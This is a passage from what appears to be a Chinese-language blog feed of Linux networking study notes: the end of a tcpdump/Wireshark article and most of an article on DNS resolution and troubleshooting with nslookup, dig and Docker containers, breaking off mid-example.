href="https://coolshell.cn/articles/11564.html">酷壳</a>)</p><p>不过，对比这两张图，这里抓到的包跟上面的四次挥手，并不完全一样，实际挥手过程只有三个包，而不是四个。</p><p>其实，之所以有三个包，是因为服务器端收到客户端的 FIN 后，服务器端同时也要关闭连接，这样就可以把 ACK 和 FIN 合并到一起发送，节省了一个包，变成了“三次挥手”。</p><p>而通常情况下，服务器端收到客户端的 FIN 后，很可能还没发送完数据，所以就会先回复客户端一个 ACK 包。稍等一会儿，完成所有数据包的发送后，才会发送 FIN 包。这也就是四次挥手了。</p><p>抓包后， Wireshark 中就会显示下面这个界面（原始网络包来自 Wireshark TCP 4-times close 示例，可以点击 <a href="https://wiki.wireshark.org/TCP%204-times%20close">这里</a> 下载）：</p><p><img src="https://static001.geekbang.org/resource/image/0e/99/0ecb6d11e5e7725107c0291c45aa7e99.png?wh=1898*186" alt="img"></p><p>当然，Wireshark 的使用方法绝不只有这些，更多的使用方法，同样可以参考 <a href="https://www.wireshark.org/docs/">官方文档</a> 以及 <a href="https://wiki.wireshark.org/">WIKI</a>。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章讲解了 tcpdump 和 Wireshark 的使用方法，并通过几个案例，学会了如何运用这两个工具来分析网络的收发过程，并找出潜在的性能问题。</p><p>当针对相同的网络服务，使用 IP 地址快而换成域名却慢很多时，就要想到，有可能是 DNS 在捣鬼。DNS 的解析，不仅包括从域名解析出 IP 地址的 A 记录请求，还包括性能工具帮你，“聪明”地从 IP 地址反查域名的 PTR 请求。</p><p>实际上， <strong>根据 IP 地址反查域名、根据端口号反查协议名称，是很多网络工具默认的行为，而这往往会导致性能工具的工作缓慢</strong>。所以，通常，网络性能工具都会提供一个选项（比如 -n 或者 -nn），来禁止名称解析。</p><p>在工作中，当你碰到网络性能问题时，不要忘记tcpdump 和 Wireshark 这两个大杀器。可以用它们抓取实际传输的网络包，再排查是否有潜在的性能问题。</p><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><strong>《Wireshark网络分析就是这么简单》</strong></p><p>《**<a href="https://www.dell.com/community/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%AE%A8%E8%AE%BA%E5%8C%BA/%E5%A6%82%E6%9E%9C%E7%9C%8B%E4%BA%86%E8%BF%99%E4%B8%AA%E4%BD%A0%E8%BF%98%E6%98%AF%E4%B8%8D%E4%BC%9A%E7%94%A8Wireshark-%E9%82%A3%E5%B0%B1%E6%9D%A5%E6%89%BE%E6%88%91%E5%90%A7-8%E6%9C%886%E6%97%A5%E5%AE%8C%E7%BB%93/td-p/7007033">Wireshark使用介绍</a>**》</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>5.dns 基本介绍与性能问题排查</title>
    <link href="/2022/11/09/5.DNS%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D%E4%B8%8E%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/"/>
    <url>/2022/11/09/5.DNS%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D%E4%B8%8E%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="5-DNS-基本介绍与性能问题排查"><a href="#5-DNS-基本介绍与性能问题排查" class="headerlink" title="5.DNS 基本介绍与性能问题排查"></a>5.DNS 基本介绍与性能问题排查</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>IP 地址是 TCP&#x2F;IP 协议中，用来确定通信双方的一个重要标识。每个 IP 地址又包括了主机号和网络号两部分。相同网络号的主机组成一个子网；不同子网再通过路由器连接，组成一个庞大的网络。</p><p>然而，IP 地址虽然方便了机器的通信，却给访问这些服务的人们，带来了很重的记忆负担。我相信，没几个人能记得住 GitHub 所在的 IP 地址，因为这串字符，对人脑来说并没有什么含义，不符合我们的记忆逻辑。</p><p>不过，这并不妨碍我们经常使用这个服务。为什么呢？当然是因为还有更简单、方便的方式。我们可以通过域名 github.com 访问，而不是必须依靠具体的 IP 地址，这其实正是域名系统 DNS 的由来。</p><p>DNS（Domain Name System），即域名系统，是互联网中最基础的一项服务，主要提供域名和 IP 地址之间映射关系的查询服务。</p><p>DNS 不仅方便了人们访问不同的互联网服务，更为很多应用提供了，动态服务发现和全局负载均衡（Global Server Load Balance，GSLB）的机制。这样，DNS 就可以选择离用户最近的 IP 来提供服务。即使后端服务的 IP 地址发生变化，用户依然可以用相同域名来访问。</p><p>DNS显然是我们工作中基础而重要的一个环节。那么，DNS 出现问题时，又该如何分析和排查呢？</p><h2 id="域名与-DNS-解析"><a href="#域名与-DNS-解析" class="headerlink" title="域名与 DNS 解析"></a>域名与 DNS 解析</h2><p>域名我们本身都比较熟悉，由一串用点分割开的字符组成，被用作互联网中的某一台或某一组计算机的名称，目的就是为了方便识别，互联网中提供各种服务的主机位置。</p><p>要注意，域名是全球唯一的，需要通过专门的域名注册商才可以申请注册。为了组织全球互联网中的众多计算机，域名同样用点来分开，形成一个分层的结构。而每个被点分割开的字符串，就构成了域名中的一个层级，并且位置越靠后，层级越高。</p><p>我们以极客时间的网站 time.geekbang.org 为例，来理解域名的含义。这个字符串中，最后面的 org 是顶级域名，中间的 geekbang 是二级域名，而最左边的 time 则是三级域名。</p><p>如下图所示，注意点（.）是所有域名的根，也就是说所有域名都以点作为后缀，也可以理解为，在域名解析的过程中，所有域名都以点结束。</p><p><img src="https://static001.geekbang.org/resource/image/1b/82/1b509317968f3f73810ac1d313ced982.png?wh=1324*544" alt="img"></p><p>通过理解这几个概念，可以看出，域名主要是为了方便让人记住，而IP 地址是机器间的通信的真正机制。把域名转换为 IP 地址的服务，就是域名解析服务（DNS），而对应的服务器就是域名服务器，网络协议则是 DNS 协议。</p><p>这里注意，DNS 协议在 TCP&#x2F;IP 栈中属于应用层，不过实际传输还是基于 UDP 或者 TCP 协议（UDP 居多） ，并且域名服务器一般监听在端口 53 上。</p><p>既然域名以分层的结构进行管理，相对应的，域名解析其实也是用递归的方式（从顶级开始，以此类推），发送给每个层级的域名服务器，直到得到解析结果。</p><p>递归查询的过程并不需要亲自操作，由DNS 服务器完成，用户只需要预先配置一个可用的 DNS 服务器就可以了。</p><p>通常来说，每级DNS 服务器，都会有最近解析记录的<strong>缓存</strong>。当缓存命中时，直接用缓存中的记录应答就可以了。如果缓存过期或者不存在，才需要用刚刚提到的递归方式查询。</p><p>所以，系统管理员在配置 Linux 系统的网络时，除了需要配置 IP 地址，还需要给它配置 DNS 服务器，这样它才可以通过域名来访问外部服务。</p><p>比如，我的系统配置的就是 114.114.114.114 这个域名服务器。可以执行下面的命令，来查询你的系统配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf</span><br>nameserver 114.114.114.114<br></code></pre></td></tr></table></figure><p>另外，DNS 服务通过资源记录的方式，来管理所有数据，它支持 A、CNAME、MX、NS、PTR 等多种类型的记录。比如：</p><ul><li><p>A 记录，用来把域名转换成 IP 地址；</p></li><li><p>CNAME 记录，用来创建别名；</p></li><li><p>而 NS 记录，则表示该域名对应的域名服务器地址。</p></li></ul><p>当我们访问某个网址时，就需要通过 DNS 的 A 记录，查询该域名对应的 IP 地址，然后再通过该 IP 来访问 Web 服务。</p><p>比如，以极客时间的网站 time.geekbang.org 为例，执行下面的 nslookup 命令，就可以查询到这个域名的 A 记录，可以看到，它的 IP 地址是 39.106.233.176：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">$ nslookup time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-meta"># 域名服务器及端口信息</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><span class="hljs-meta">#53</span><br><br><span class="hljs-meta"># 非权威查询结果</span><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">39.106</span><span class="hljs-number">.233</span><span class="hljs-number">.17</span><br><br></code></pre></td></tr></table></figure><p>这里要注意，由于 114.114.114.114 并不是直接管理 time.geekbang.org 的域名服务器，所以查询结果是非权威的。使用上面的命令，你只能得到 114.114.114.114 查询的结果。</p><p>前面还提到了，如果没有命中缓存，DNS 查询实际上是一个递归过程，那有没有方法可以知道整个递归查询的执行呢？</p><p>其实除了 nslookup，另外一个常用的 DNS 解析工具 dig ，就提供了 trace 功能，可以展示递归查询的整个过程。例如可以执行下面的命令，得到查询结果：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># +trace表示开启跟踪查询</span><br><span class="hljs-comment"># +nodnssec表示禁止DNS安全扩展</span><br>$ <span class="hljs-keyword">dig </span>+trace +nodnssec time.geekbang.<span class="hljs-keyword">org</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.3-Ubuntu &lt;&lt;&gt;&gt; +trace +nodnssec time.geekbang.org</span><br><span class="hljs-comment">;; global options: +cmd</span><br>.<span class="hljs-number">322086</span>INNSm.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSa.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSi.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSd.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSg.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSl.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSc.root-servers.net.<br>.<span class="hljs-number">322086</span>INNS<span class="hljs-keyword">b.root-servers.net.</span><br><span class="hljs-keyword"></span>.<span class="hljs-number">322086</span>INNSh.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSe.root-servers.net.<br>.<span class="hljs-number">322086</span>INNSk.root-servers.net.<br>.<span class="hljs-number">322086</span>INNS<span class="hljs-keyword">j.root-servers.net.</span><br><span class="hljs-keyword"></span>.<span class="hljs-number">322086</span>INNSf.root-servers.net.<br><span class="hljs-comment">;; Received 239 bytes from 114.114.114.114#53(114.114.114.114) in 1340 ms</span><br><br><span class="hljs-keyword">org.</span><span class="hljs-number">172800</span>INNS<span class="hljs-built_in">a0</span>.<span class="hljs-keyword">org.afilias-nst.info.</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">org.</span><span class="hljs-number">172800</span>INNS<span class="hljs-built_in">a2</span>.<span class="hljs-keyword">org.afilias-nst.info.</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">org.</span><span class="hljs-number">172800</span>INNS<span class="hljs-keyword">b0.org.afilias-nst.org.</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">org.</span><span class="hljs-number">172800</span>INNS<span class="hljs-keyword">b2.org.afilias-nst.org.</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">org.</span><span class="hljs-number">172800</span>INNSc0.<span class="hljs-keyword">org.afilias-nst.info.</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">org.</span><span class="hljs-number">172800</span>INNSd0.<span class="hljs-keyword">org.afilias-nst.org.</span><br><span class="hljs-keyword"></span><span class="hljs-comment">;; Received 448 bytes from 198.97.190.53#53(h.root-servers.net) in 708 ms</span><br><br>geekbang.<span class="hljs-keyword">org.</span><span class="hljs-number">86400</span>INNSdns9.hichina.com.<br>geekbang.<span class="hljs-keyword">org.</span><span class="hljs-number">86400</span>INNSdns10.hichina.com.<br><span class="hljs-comment">;; Received 96 bytes from 199.19.54.1#53(b0.org.afilias-nst.org) in 1833 ms</span><br><br>time.geekbang.<span class="hljs-keyword">org.</span><span class="hljs-number">600</span>INA<span class="hljs-number">39</span>.<span class="hljs-number">106</span>.<span class="hljs-number">233</span>.<span class="hljs-number">176</span><br><span class="hljs-comment">;; Received 62 bytes from 140.205.41.16#53(dns10.hichina.com) in 4 ms</span><br><br></code></pre></td></tr></table></figure><p>dig trace 的输出，主要包括四部分。</p><ul><li><p>第一部分，是从 114.114.114.114 查到的一些根域名服务器（.）的 NS 记录。</p></li><li><p>第二部分，是从 NS 记录结果中选一个（h.root-servers.net），并查询顶级域名 org. 的 NS 记录。</p></li><li><p>第三部分，是从 org. 的 NS 记录中选择一个（b0.org.afilias-nst.org），并查询二级域名 geekbang.org. 的 NS 服务器。</p></li><li><p>最后一部分，就是从 geekbang.org. 的 NS 服务器（dns10.hichina.com）查询最终主机 time.geekbang.org. 的 A 记录。</p></li></ul><p>这个输出里展示的各级域名的 NS 记录，其实就是各级域名服务器的地址，流程图如下：</p><p><img src="https://static001.geekbang.org/resource/image/5f/d3/5ffda41ec62fc3c9e0de3fa3443c9cd3.png?wh=1322*740" alt="img"></p><p>不仅仅是发布到互联网的服务需要域名，很多时候，我们也希望能对局域网内部的主机进行域名解析（即内网域名，大多数情况下为主机名）。Linux 也支持这种行为。</p><p>所以，可以把主机名和 IP 地址的映射关系，写入本机的 &#x2F;etc&#x2F;hosts 文件中。这样，指定的主机名就可以在本地直接找到目标 IP。比如，你可以执行下面的命令来操作：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$ cat /etc/hosts<br><span class="hljs-number">127.0.0.1</span>   localhost localhost.localdomain<br>::<span class="hljs-number">1</span>         localhost6 localhost6.localdomain6<br><span class="hljs-number">192.168.0.100</span> domain.com<br><br></code></pre></td></tr></table></figure><p>或者，你还可以在内网中，搭建自定义的 DNS 服务器，专门用来解析内网中的域名。而内网 DNS 服务器，一般还会设置一个或多个上游 DNS 服务器，用来解析外网的域名。</p><p>清楚域名与 DNS 解析的基本原理后，接下来，一起来看几个案例，实战分析 DNS 解析出现问题时，该如何定位。</p><h2 id="案例准备"><a href="#案例准备" class="headerlink" title="案例准备"></a>案例准备</h2><p>本次案例还是基于 Ubuntu 18.04，同样适用于其他的 Linux 系统。我使用的案例环境如下所示：</p><ul><li><p>机器配置：2 CPU，8GB 内存。</p></li><li><p>预先安装 docker 等工具，如 apt install docker.io。</p></li></ul><p>先打开一个终端，SSH 登录到 Ubuntu 机器中，然后执行下面的命令，拉取案例中使用的 Docker 镜像：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> docker pull feisky/dnsutils<br><span class="hljs-keyword">Using</span> default tag: latest<br>...<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> feisky/dnsutils:latest<br><br></code></pre></td></tr></table></figure><p>然后，运行下面的命令，查看主机当前配置的 DNS 服务器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf</span><br>nameserver 114.114.114.114<br></code></pre></td></tr></table></figure><p>可以看到，这台主机配置的 DNS 服务器是 114.114.114.114。</p><p>到这里，准备工作就完成了。接下来，正式进入操作环节。</p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><h3 id="案例1：DNS解析失败"><a href="#案例1：DNS解析失败" class="headerlink" title="案例1：DNS解析失败"></a>案例1：DNS解析失败</h3><p>首先，执行下面的命令，进入今天的第一个案例。将看到下面这个输出：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 进入案例环境的SHELL终端中</span><br><span class="hljs-variable">$ </span>docker run -it --rm -v <span class="hljs-variable">$(</span>mktemp)<span class="hljs-symbol">:/etc/resolv</span>.conf feisky/dnsutils bash<br>root<span class="hljs-variable">@7e9ed6ed4974</span><span class="hljs-symbol">:/</span><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><blockquote><p>注意：下面的代码段中， &#x2F;# 开头的命令都表示在容器内部运行的命令。</p></blockquote><p>接着，继续在容器终端中，执行 DNS 查询命令，还是查询 time.geekbang.org 的 IP 地址：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/# nslookup <span class="hljs-type">time</span>.geekbang.org<br>;; <span class="hljs-keyword">connection</span> timed <span class="hljs-keyword">out</span>; <span class="hljs-keyword">no</span> servers could be reached<br><br></code></pre></td></tr></table></figure><p>可以发现，这个命令阻塞很久后，还是失败了，报了 connection timed out 和 no servers could be reached 错误。</p><p>看到这里，估计你的第一反应就是网络不通了，到底是不是这样呢？我们用 ping 工具检查试试。执行下面的命令，就可以测试本地到 114.114.114.114 的连通性：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/#<span class="hljs-built_in"> ping </span>-c3 114.114.114.114<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>114.114.114.114 (114.114.114.114): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=56 <span class="hljs-attribute">time</span>=31.116 ms<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=60 <span class="hljs-attribute">time</span>=31.245 ms<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=68 <span class="hljs-attribute">time</span>=31.128 ms<br>--- 114.114.114.114<span class="hljs-built_in"> ping </span>statistics ---<br>3 packets transmitted, 3 packets received, 0% packet loss<br>round-trip min/avg/max/stddev = 31.116/31.163/31.245/0.058 ms<br><br></code></pre></td></tr></table></figure><p>这个输出中，可以看到网络是通的。那要怎么知道nslookup 命令失败的原因呢？这里其实有很多方法，最简单的一种，就是开启 nslookup 的调试输出，查看查询过程中的详细步骤，排查其中是否有异常。</p><p>比如，我们可以继续在容器终端中，执行下面的命令：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/# nslookup -<span class="hljs-keyword">debug</span> <span class="hljs-type">time</span>.geekbang.org<br>;; <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>#<span class="hljs-number">53</span>(<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>) <span class="hljs-keyword">for</span> <span class="hljs-type">time</span>.geekbang.org failed: <span class="hljs-keyword">connection</span> refused.<br>;; <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> ::<span class="hljs-number">1</span>#<span class="hljs-number">53</span>(::<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> <span class="hljs-type">time</span>.geekbang.org failed: address <span class="hljs-keyword">not</span> available.<br><br></code></pre></td></tr></table></figure><p>从这次的输出可以看到，nslookup 连接环回地址（127.0.0.1 和 ::1）的 53 端口失败。这里就有问题了，为什么会去连接环回地址，而不是我们的先前看到的 114.114.114.114 呢？</p><p>因为容器中没有配置 DNS 服务器。那我们就执行下面的命令确认一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">/# </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf</span><br><br></code></pre></td></tr></table></figure><p>果然，这个命令没有任何输出，说明容器里的确没有配置 DNS 服务器。到这一步，很自然的，我们就知道了解决方法。在 &#x2F;etc&#x2F;resolv.conf 文件中，配置上 DNS 服务器就可以了。</p><p>执行下面的命令，在配置好 DNS 服务器后，重新执行 nslookup 命令。这次可以正常解析了：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">/<span class="hljs-meta"># echo &quot;nameserver 114.114.114.114&quot; &gt; /etc/resolv.conf</span><br>/<span class="hljs-meta"># nslookup time.geekbang.org</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">39.106</span><span class="hljs-number">.233</span><span class="hljs-number">.176</span><br><br></code></pre></td></tr></table></figure><p>到这里，第一个案例就轻松解决了。最后，在终端中执行 exit 命令退出容器，Docker 就会自动清理刚才运行的容器。</p><h3 id="案例2：DNS解析不稳定"><a href="#案例2：DNS解析不稳定" class="headerlink" title="案例2：DNS解析不稳定"></a>案例2：DNS解析不稳定</h3><p>接下来，再来看第二个案例。执行下面的命令，启动一个新的容器，并进入它的终端中：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ docker run -it <span class="hljs-params">--rm</span> <span class="hljs-params">--cap-add=NET_ADMIN</span> <span class="hljs-params">--dns</span> 8.8.8.8 feisky/dnsutils bash<br>root@0<span class="hljs-keyword">cd</span>3ee0c8ecb:/<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>然后，跟上一个案例一样，还是运行 nslookup 命令，解析 time.geekbang.org 的 IP 地址。不过，这次要加一个 time 命令，输出解析所用时间。如果一切正常，会看到如下输出：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">/<span class="hljs-meta"># time nslookup time.geekbang.org</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">39.106</span><span class="hljs-number">.233</span><span class="hljs-number">.176</span><br><br>real<span class="hljs-number">0</span>m10<span class="hljs-number">.349</span>s<br>user<span class="hljs-number">0</span>m0<span class="hljs-number">.004</span>s<br>sys<span class="hljs-number">0</span>m0<span class="hljs-number">.0</span><br><br></code></pre></td></tr></table></figure><p>可以看到，这次解析非常慢，居然用了 10 秒。如果你多次运行上面的 nslookup 命令，可能偶尔还会碰到下面这种错误：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/# <span class="hljs-type">time</span> nslookup <span class="hljs-type">time</span>.geekbang.org<br>;; <span class="hljs-keyword">connection</span> timed <span class="hljs-keyword">out</span>; <span class="hljs-keyword">no</span> servers could be reached<br><br><span class="hljs-type">real</span><span class="hljs-number">0</span>m15<span class="hljs-number">.011</span>s<br><span class="hljs-keyword">user</span><span class="hljs-number">0</span>m0<span class="hljs-number">.006</span>s<br>sys<span class="hljs-number">0</span>m0<span class="hljs-number">.006</span>s<br><br></code></pre></td></tr></table></figure><p>换句话说，跟上一个案例类似，也会出现解析失败的情况。综合来看，现在 DNS 解析的结果不但比较慢，而且还会发生超时失败的情况。</p><p>这是为什么呢？碰到这种问题该怎么处理呢？</p><p>根据前面的讲解，我们知道，DNS 解析，说白了就是客户端与服务器交互的过程，并且这个过程还使用了 UDP 协议。</p><p>那么，对于整个流程来说，解析结果不稳定，就有很多种可能的情况了。比方说：</p><ul><li><p>DNS 服务器本身有问题，响应慢并且不稳定；</p></li><li><p>或者是，客户端到 DNS 服务器的网络延迟比较大；</p></li><li><p>再或者，DNS 请求或者响应包，在某些情况下被链路中的网络设备弄丢了。</p></li></ul><p>根据上面 nslookup 的输出，你可以看到，现在客户端连接的DNS 是 8.8.8.8，这是 Google 提供的 DNS 服务。对 Google 我们还是比较放心的，DNS 服务器出问题的概率应该比较小。基本排除了DNS服务器的问题，那是不是第二种可能，本机到 DNS 服务器的延迟比较大呢？</p><p>前面讲过，ping 可以用来测试服务器的延迟。比如，你可以运行下面的命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/#<span class="hljs-built_in"> ping </span>-c3 8.8.8.8<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>8.8.8.8 (8.8.8.8): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=31 <span class="hljs-attribute">time</span>=137.637 ms<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=31 <span class="hljs-attribute">time</span>=144.743 ms<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=31 <span class="hljs-attribute">time</span>=138.576 ms<br>--- 8.8.8.8<span class="hljs-built_in"> ping </span>statistics ---<br>3 packets transmitted, 3 packets received, 0% packet loss<br>round-trip min/avg/max/stddev = 137.637/140.319/144.743/3.152 ms<br><br></code></pre></td></tr></table></figure><p>从ping 的输出可以看到，这里的延迟已经达到了 140ms，这也就可以解释，为什么解析这么慢了。实际上，如果多次运行上面的 ping 测试，还会看到偶尔出现的丢包现象。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$<span class="hljs-built_in"> ping </span>-c3 8.8.8.8<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>8.8.8.8 (8.8.8.8): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=30 <span class="hljs-attribute">time</span>=134.032 ms<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span 